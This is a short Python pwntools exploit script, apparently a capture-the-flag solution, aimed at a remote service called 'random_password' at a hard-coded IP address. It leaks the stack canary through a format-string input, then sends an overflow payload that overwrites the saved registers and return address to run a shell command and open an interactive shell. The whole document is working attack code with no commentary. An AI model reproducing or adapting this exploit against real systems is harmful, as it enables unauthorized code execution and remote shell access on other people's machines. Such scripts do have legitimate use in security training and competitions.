from pwn import *

context(
    terminal = ['urxvt', '--hold', '-e', 'bash', '-c']
)

# p = process('./random_password')
p = remote('165.22.73.179', 709)

# leak stack cookie

if False:
    gdb.attach(p, '''
        b *0x80493c4
        b *0x80493ae
        b login
        c
    ''')

num = 15

p.sendline('%' + str(num) + '$x')

p.recvuntil('Hello ')

cookie = int(p.recvline().strip(), 16)

print 'Stack Cookie:', hex(cookie)

addr_troll_shell = 0x804a008
addr_shell = addr_troll_shell + len('false && ')

off_cookie = 0x10
off_ret    = 0x20
off_sfp    = off_ret - 4
off_ebx    = 0x18
off_arg1   = off_ret + 4


ebp = 0x804b3a0 + 8
ebx = 0x804b354

p.sendline(fit({
    off_cookie : p32(cookie),
    off_sfp    : p32(ebp),
    off_ebx    : p32(ebx),
    off_ret    : p32(0x8049392),
    off_arg1   : p32(addr_shell)
}))

p.interactive()
